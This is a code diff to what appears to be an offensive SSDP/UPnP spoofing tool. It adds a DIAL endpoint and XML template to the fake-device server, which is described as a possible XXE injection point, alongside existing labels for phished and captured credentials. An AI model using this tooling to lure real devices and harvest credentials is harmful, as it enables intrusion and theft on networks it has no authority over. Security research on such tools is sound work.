@@ -69,6 +69,7 @@ class PC:
     warn_box = orange + '[!] ' + endc
     msearch_box = blue + '[M-SEARCH]     ' + endc
     xml_box = green + '[XML REQUEST]  ' + endc
+    dial_box = green + '[DIAL REQUEST] ' + endc
     phish_box = red + '[PHISH HOOKED] ' + endc
     creds_box = red + '[CREDS GIVEN]  ' + endc
     xxe_box = red + '[XXE VULN!!!!] ' + endc
@@ -250,6 +251,22 @@ def build_class(upnp_args):
             return xml_file
 
         @staticmethod
+        def build_dial_xml():
+            """
+            Builds an additional XML file used by DIAL specification.
+            Might be a good XXE injection point, if an app uses a different
+            library to parse the DIAL spec than the original SSDP spec.
+            """
+            variables = {'local_ip': local_ip,
+                         'local_port': local_port,
+                         'smb_server': smb_server,
+                         'session_usn': session_usn}
+            file_in = open(template_dir + '/dial.xml')
+            template = Template(file_in.read())
+            xml_file = template.substitute(variables)
+            return xml_file
+
+        @staticmethod
         def build_service_xml():
             """
             Builds the service descriptor XML file.
@@ -314,8 +331,19 @@ def build_class(upnp_args):
                 # Parsed automatically by all SSDP apps
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
+                # The following header is only used by the DIAL specification.
+                # It  PROBABLY won't interfere with other SSDP stuff.
+                rest_url = ('http://{}:{}/dial-rest-service/'
+                            .format(local_ip, local_port))
+                #rest_url = 'file://{}/rest'.format(local_ip)
+                self.send_header('Application-URL', rest_url)
                 self.end_headers()
                 self.wfile.write(self.build_device_xml().encode())
+            elif '/dial-rest-service' in self.path:
+                self.send_response(200)
+                self.send_header('Content-type', 'text/xml')
+                self.end_headers()
+                self.wfile.write(self.build_dial_xml().encode())
             elif self.path == '/ssdp/service-desc.xml':
                 # Not yet implemented
                 self.send_response(200)
@@ -423,6 +451,10 @@ def build_class(upnp_args):
             path = self.path
             if 'xml' in self.path:
                 print(PC.xml_box + "Host: {}, User-Agent: {}"
+                      .format(address, agent))
+                print("               {} {}".format(verb, path))
+            elif 'dial-rest-service' in self.path:
+                print(PC.dial_box + "Host: {}, User-Agent: {}"
                       .format(address, agent))
                 print("               {} {}".format(verb, path))
             elif 'xxe.html' in self.path:
